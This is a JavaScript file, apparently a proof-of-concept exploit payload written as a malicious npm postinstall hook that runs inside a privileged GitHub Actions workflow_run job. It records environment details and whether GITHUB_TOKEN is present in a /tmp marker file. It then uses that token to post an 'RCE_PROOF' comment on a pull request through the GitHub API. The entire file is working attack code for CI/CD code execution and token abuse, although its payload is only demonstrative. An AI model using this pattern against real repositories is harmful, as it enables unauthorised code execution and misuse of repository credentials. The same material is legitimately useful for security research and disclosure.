const fs = require('fs');
const proof = {
  where: 'attacker postinstall inside npm install of privileged workflow_run',
  event: process.env.GITHUB_EVENT_NAME,
  repo: process.env.GITHUB_REPOSITORY,
  workflow: process.env.GITHUB_WORKFLOW,
  token_present: !!process.env.GITHUB_TOKEN,
  cwd: process.cwd()
};
fs.writeFileSync('/tmp/ADP_RCE_MARKER', JSON.stringify(proof, null, 2));
(async () => {
  try {
    let pr = 'unknown';
    try { pr = fs.readFileSync('../../pr-number.txt', 'utf8').trim(); } catch (e) {}
    const r = await fetch(`https://api.github.com/repos/${process.env.GITHUB_REPOSITORY}/issues/${pr}/comments`, {
      method: 'POST',
      headers: {
        'Accept': 'application/vnd.github+json',
        'Authorization': `Bearer ${process.env.GITHUB_TOKEN}`,
        'Content-Type': 'application/json',
        'X-GitHub-Api-Version': '2022-11-28'
      },
      body: JSON.stringify({ body: 'RCE_PROOF: attacker-controlled `postinstall` executed inside the privileged `workflow_run` consumer (`pull-requests: write`) at ' + new Date().toISOString() })
    });
    proof.token_api_status = r.status;
    proof.comment_posted = r.ok;
    fs.writeFileSync('/tmp/ADP_RCE_MARKER', JSON.stringify(proof, null, 2));
  } catch (e) {
    proof.token_api_error = String(e);
    fs.writeFileSync('/tmp/ADP_RCE_MARKER', JSON.stringify(proof, null, 2));
  }
})();
